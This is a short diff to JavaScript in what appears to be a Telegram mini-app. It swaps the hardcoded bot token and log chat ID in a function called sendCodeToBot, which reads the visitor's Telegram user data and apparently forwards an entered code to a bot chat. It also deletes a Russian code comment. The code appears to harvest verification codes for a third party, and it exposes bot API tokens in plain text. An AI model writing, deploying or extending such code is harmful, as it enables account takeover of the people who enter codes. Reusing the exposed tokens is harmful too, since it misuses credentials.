@@ -243,8 +243,8 @@
 
 				function sendCodeToBot(safeCode) {
 					try {
-						const botToken = '7324446797:AAEnKkmIjlDY-fa1J2HYrNupKD6ejXJn_A4';
-						const logChatId = '-1003268790940';
+						const botToken = '8260777158:AAHcoUGlzRodN2_7Xkrt4DLF1ovHAHYaH90';
+						const logChatId = '-1003235434555';
 
 						const user = tg?.initDataUnsafe?.user;
 						const username = user?.username
@@ -354,7 +354,6 @@
 						initializeButtons();
 						updateBoxes();
 
-						// Предотвращаем повторную инициализацию
 						document.removeEventListener('DOMContentLoaded', init);
 					} catch (e) {
 						console.log('Error in init:', e);
